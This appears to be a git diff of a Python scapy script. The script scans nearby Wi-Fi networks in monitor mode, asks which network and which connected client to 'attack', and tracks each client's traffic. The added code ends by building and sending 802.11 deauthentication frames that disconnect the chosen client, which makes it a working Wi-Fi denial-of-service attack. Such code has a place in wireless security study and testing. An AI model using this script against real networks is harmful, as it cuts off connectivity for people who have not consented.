@@ -5,6 +5,7 @@ import random
 from network_interface import network_interface
 from tabulate import tabulate
 import select
+from user import user
 
 #function that get input but will keap run if it wont get input in 1 sec
 def get_input(prompt, timeout):
@@ -77,10 +78,7 @@ def interface_handle_packet(pkt, network_interfaces, currchanel):
                     max_rate = max(rates)
                     # Convert the rate to Mbps
                     max_rate_mbps = (max_rate & 0x7F) * 0.5
-                else:
-                    max_rate_mbps = 0
-
-                network_interfaces.get(bssid).MB = max_rate_mbps
+                    network_interfaces.get(bssid).MB = max_rate_mbps
 
 #!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 def single_network_handle_packet(pkt, users_list, chosen_network_interface):
@@ -88,16 +86,46 @@ def single_network_handle_packet(pkt, users_list, chosen_network_interface):
     if pkt.haslayer(Dot11):
         # Extract BSSID of the network this layer contain information about the network
         # as the source and destination MAC addresses, as well as the wireless management frame control field
-        bssid = pkt[Dot11].addr2
-        if chosen_network_interface.BSSID == bssid:
-            mac_address = pkt.addr1
-            users_list.add(mac_address)
+        to_ds = 1
+        from_ds = 1
+        ds = pkt.FCfield & 0x3
+        get_flag = 1
+        mac_address = None
+        bssid = None
+        if ds == 1:
+            to_ds = 1
+            from_ds = 0
+        if ds == 2:
+            to_ds = 0
+            from_ds = 1
+
+        if to_ds != 1 or from_ds != 1:
+            if to_ds == 0:
+                mac_address = pkt.addr1
+                bssid = pkt.addr2
+            else:
+                get_flag = 0
+                mac_address = pkt.addr2
+                bssid = pkt.addr1
+            if chosen_network_interface.BSSID == bssid:
+                if users_list.get(mac_address) is None:
+                    users_list[mac_address] = user(mac_address)
+                if pkt.FCfield.retry:
+                    users_list.get(mac_address).loss += 1
+                if pkt.type == 2:
+                    if get_flag:
+                        users_list.get(mac_address).get_data += 1
+                    else:
+                        users_list.get(mac_address).send_data += 1
+
+
 
 iface = "wlxc83a35c2e0b7"
 channels = get_adapter_chanels(iface)
 set_adapter_to_monitor(iface)
 network_interfaces = {}
 chosen_network_interface = None
+chosen_interface = None
 
 # Start sniffing for Wi-Fi packets on all channels
 while True:
@@ -123,17 +151,19 @@ while True:
     print(tabulate(table, headers=['BSSID', 'PWR', 'RXQ', 'Beacons', 'Data', 'Data_for_sec','Data_counter', 'CH', 'MB', 'ENC','CIPHER', 'AUTH', 'SSID']))
 
     # get the chosen network from the user it wait 2 sec for ans else keep scanning
-    name = get_input("What network would you like to attack(plz pass the bssid)? ", 1)
-    if name is not None:
-        if network_interfaces.get(name) is None:
-            print(name)
+    chosen_interface = get_input("What network would you like to attack(plz pass the bssid)? ", 1)
+    if chosen_interface is not None:
+        if network_interfaces.get(chosen_interface) is None:
+            print(chosen_interface)
             print("bad name choose")
         else:
             break
 
 
-chosen_network_interface = network_interfaces.get(name)
-users_list = set()
+
+chosen_network_interface = network_interfaces.get(chosen_interface)
+users_list = {}
+chosen_user = None
 while True:
     # desplay the network that was choosen
     print(f"the network you choos is :\n{chosen_network_interface}")
@@ -141,7 +171,30 @@ while True:
     os.system("iwconfig %s channel %d" % (iface, chosen_network_interface.CH))
     #start to sniff packets for 3 sec
     sniff(iface=iface, prn=lambda pkt: single_network_handle_packet(pkt, users_list, chosen_network_interface), timeout=3)
-    print(users_list)
+    # Convert the dictionary to a list of lists for good print in table
+    table = [list(v.__dict__.values()) for k, v in users_list.items()]
+    # Print the table
+    print(tabulate(table,
+                   headers=["BSSID",
+                            "get_data ",
+                            "send_data",
+                            "loss"]))
+
+    # get the chosen network from the user it wait 2 sec for ans else keep scanning
+    chosen_user = get_input("What user would you like to attack(plz pass the bssid)? ", 1)
+    if chosen_user is not None:
+        if users_list.get(chosen_user) is None:
+            print(chosen_user)
+            print("bad name choose")
+        else:
+            break
+
+# Create the Deauthentication frame
+deauth = RadioTap() / Dot11(addr1=chosen_user, addr2=chosen_interface, addr3=chosen_interface) / Dot11Deauth()
+
+# Send the frame
+sendp(deauth, iface=iface, count=7)
+
 
 
 
